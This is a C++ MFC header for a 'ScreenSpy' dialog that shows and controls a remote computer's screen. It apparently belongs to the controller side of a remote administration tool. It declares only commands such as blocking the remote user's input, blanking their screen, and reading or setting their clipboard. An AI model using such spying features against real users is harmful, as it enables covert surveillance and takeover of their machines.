#pragma once

#include "CursorInfo.h"
#include "BmpToAviDif.h"
/////////////////////////////////////////////////////////////////////////////
// CDifScreenSpyDlg dialog

enum
{
	TOKEN_FIRSTSCREEN_DIF,
	TOKEN_NEXTSCREEN_DIF,
	TOKEN_CLIPBOARD_TEXT_DIF,
	TOKEN_SIZE_DIF,
	COMMAND_NEXT_DIF,
	COMMAND_SCREEN_RESET_DIF,
	COMMAND_SCREEN_FPS_DIF,
	COMMAND_SCREEN_BLOCK_INPUT_DIF,
	COMMAND_SCREEN_BLANK_DIF,
	COMMAND_SCREEN_CAPTURE_LAYER_DIF,
	COMMAND_SCREEN_GET_CLIPBOARD_DIF,
	COMMAND_SCREEN_CONTROL_DIF,
	COMMAND_SCREEN_SET_CLIPBOARD_DIF,
};





class CDifScreenSpyDlg : public CDialog
{
	// Construction
public:
	void OnReceiveComplete();
	void OnReceive();
	CDifScreenSpyDlg(CWnd* pParent = NULL, ISocketBase* pIOCPServer = NULL, ClientContext* pContext = NULL);  

	enum {IDD = IDD_SCREEN};
public:
	virtual BOOL PreTranslateMessage(MSG* pMsg);
protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	virtual void PostNcDestroy();
	virtual void OnCancel();
	virtual LRESULT WindowProc(UINT message, WPARAM wParam, LPARAM lParam);
	//}}AFX_VIRTUAL

// Implementation
protected:
	BOOL m_bOnClose;

	PBYTE pDeCompressionData;
	// Generated message map functions
	//{{AFX_MSG(CDifScreenSpyDlg)
	virtual BOOL OnInitDialog();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnSize(UINT nType, int cx, int cy);
	//afx_msg void OnClose();
	void DoPaint();
	afx_msg void OnPaint();
	afx_msg void OnTimer(UINT nIDEvent);
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
private:

	HICON m_hIcon;
	void DrawTipString(CString str);
	HDC m_hDC, m_hMemDC;
	HBITMAP	m_hFullBitmap;
	LPVOID m_lpScreenDIB;
	//CRITICAL_SECTION m_cs;
	//CLCS m_clcs;
	CString m_aviFile; // 录像文件名。如果文件名不为空就写入
	CBmpToAvidif	m_aviStream;

	LPBITMAPINFO m_lpbmi, m_lpbmi_rect;
	UINT m_nCount;
	long long alldata;
	UINT m_nCountHeart;
	HCURSOR	m_hRemoteCursor;
	DWORD	m_dwCursor_xHotspot, m_dwCursor_yHotspot;
	POINT	m_RemoteCursorPos;
	BYTE	m_bCursorIndex;
	CCursorInfo	m_CursorInfo;
	DWORD nUnCompressLength_old;
	void ResetScreen();
	void DrawNextScreenDiff(PBYTE pDeCompressionData, unsigned long	destLen );
	void SendResetScreen(int nBitCount);
	void SendResetScreenFps(int nfps);
	bool SaveSnapshot();
	void UpdateLocalClipboard(char* buf, int len);
	void SendLocalClipboard();
	bool m_bIsFirst;
	bool m_bIsTraceCursor;
	ClientContext* m_pContext;
	ISocketBase* m_iocpServer;
	CString m_IPAddress;
	bool m_bIsCtrl;
	void SendCommand(MSG* pMsg);

	//自适应
	CRect rect;
	double           m_wZoom;            // 屏幕横向缩放比
	double           m_hZoom;            // 屏幕纵向缩放比
	MYtagMSG* m_MYtagMSG ;
	int m_MYtagMSGsize;
	RECT m_rect;


};
